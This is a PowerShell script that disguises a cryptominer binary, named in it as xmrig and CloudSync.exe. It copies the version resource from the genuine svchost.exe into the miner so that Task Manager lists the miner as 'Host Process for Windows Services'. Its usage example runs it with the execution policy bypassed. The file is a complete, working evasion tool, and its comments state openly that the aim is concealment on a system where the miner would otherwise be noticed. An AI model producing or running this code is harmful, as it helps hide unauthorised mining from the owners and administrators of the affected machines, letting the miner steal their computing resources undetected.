<#
.SYNOPSIS
    Gives the miner binary a Windows-looking version resource.

.DESCRIPTION
    Task Manager shows a process by image name plus its FileDescription (from
    the PE RT_VERSION resource). A stock miner shows "xmrig.exe" with no
    description at all, which is a giveaway even after renaming.

    This copies the RT_VERSION resource out of a real Windows system binary
    (svchost.exe by default) and injects it into the target, so the process
    presents as "svchost.exe / Host Process for Windows Services" - one more
    entry among the ~80 already running.

    It only rewrites resources; code, imports and offsets are untouched.

.PARAMETER Path
    Binary to disguise.

.PARAMETER From
    Donor binary whose version resource is copied (default: svchost.exe).

.EXAMPLE
    powershell -NoProfile -ExecutionPolicy Bypass -File .\camo.ps1 -Path .\CloudSync.exe
#>
[CmdletBinding()]
param(
    [string]$Path,
    [string]$From = (Join-Path $env:SystemRoot 'System32\svchost.exe')
)

$ErrorActionPreference = 'Stop'

if (-not $Path) {
    $Path = Join-Path $PSScriptRoot 'svchost.exe'
    if (-not (Test-Path $Path)) { $Path = Join-Path $PSScriptRoot 'CloudSync.exe' }
}
if (-not (Test-Path $Path)) { throw "target not found: $Path" }
if (-not (Test-Path $From)) { throw "donor not found: $From" }

Write-Host "=== process camouflage ==="
Write-Host "target: $Path"
Write-Host "donor : $From"

if (-not ('PeRes' -as [type])) {
    Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;

public static class PeRes
{
    [DllImport("kernel32", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern IntPtr BeginUpdateResource(string pFileName, bool bDeleteExistingResources);

    [DllImport("kernel32", SetLastError=true)]
    public static extern bool UpdateResource(IntPtr hUpdate, IntPtr lpType, IntPtr lpName,
                                             ushort wLanguage, byte[] lpData, uint cbData);

    [DllImport("kernel32", SetLastError=true)]
    public static extern bool EndUpdateResource(IntPtr hUpdate, bool fDiscard);

    [DllImport("kernel32", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern IntPtr LoadLibraryEx(string lpLibFileName, IntPtr hFile, uint dwFlags);

    [DllImport("kernel32", SetLastError=true)]
    public static extern IntPtr FindResource(IntPtr hModule, IntPtr lpName, IntPtr lpType);

    [DllImport("kernel32", SetLastError=true)]
    public static extern IntPtr LoadResource(IntPtr hModule, IntPtr hResInfo);

    [DllImport("kernel32", SetLastError=true)]
    public static extern uint SizeofResource(IntPtr hModule, IntPtr hResInfo);

    [DllImport("kernel32", SetLastError=true)]
    public static extern IntPtr LockResource(IntPtr hResData);

    [DllImport("kernel32", SetLastError=true)]
    public static extern bool FreeLibrary(IntPtr hModule);
}
'@
}

$RT_VERSION = 16
$LOAD_LIBRARY_AS_DATAFILE = 0x00000002

# ---- 1. pull the donor resource -----------------------------------------
$hSrc = [PeRes]::LoadLibraryEx($From, [IntPtr]::Zero, $LOAD_LIBRARY_AS_DATAFILE)
if ($hSrc -eq [IntPtr]::Zero) { throw "LoadLibraryEx failed for donor" }

$hRes = [PeRes]::FindResource($hSrc, [IntPtr]1, [IntPtr]$RT_VERSION)
if ($hRes -eq [IntPtr]::Zero) { throw "donor has no RT_VERSION resource" }

$size = [PeRes]::SizeofResource($hSrc, $hRes)
$hData = [PeRes]::LoadResource($hSrc, $hRes)
$pData = [PeRes]::LockResource($hData)
if ($size -eq 0 -or $pData -eq [IntPtr]::Zero) { throw "could not lock donor resource" }

$blob = New-Object byte[] $size
[Runtime.InteropServices.Marshal]::Copy($pData, $blob, 0, [int]$size)
[PeRes]::FreeLibrary($hSrc) | Out-Null
Write-Host ("  donor RT_VERSION: {0} bytes" -f $blob.Length)

# ---- 2. write it into the target ----------------------------------------
$hUpd = [PeRes]::BeginUpdateResource($Path, $false)
if ($hUpd -eq [IntPtr]::Zero) { throw "BeginUpdateResource failed (is the file writable and not running?)" }

$ok = [PeRes]::UpdateResource($hUpd, [IntPtr]$RT_VERSION, [IntPtr]1, 0, $blob, [uint32]$blob.Length)
if (-not $ok) {
    [PeRes]::EndUpdateResource($hUpd, $true) | Out-Null
    throw "UpdateResource failed"
}
if (-not [PeRes]::EndUpdateResource($hUpd, $false)) { throw "EndUpdateResource failed" }

# ---- 3. verify ----------------------------------------------------------
$vi = (Get-Item -LiteralPath $Path).VersionInfo
Write-Host "  FileDescription : $($vi.FileDescription)"
Write-Host "  CompanyName     : $($vi.CompanyName)"
Write-Host "  ProductName     : $($vi.ProductName)"
Write-Host "  FileVersion     : $($vi.FileVersion)"

if ([string]::IsNullOrWhiteSpace($vi.FileDescription)) {
    Write-Host "  [FAIL] no FileDescription after patch" -ForegroundColor Red
    exit 1
}
Write-Host "  [ OK ] version resource applied" -ForegroundColor Green
exit 0
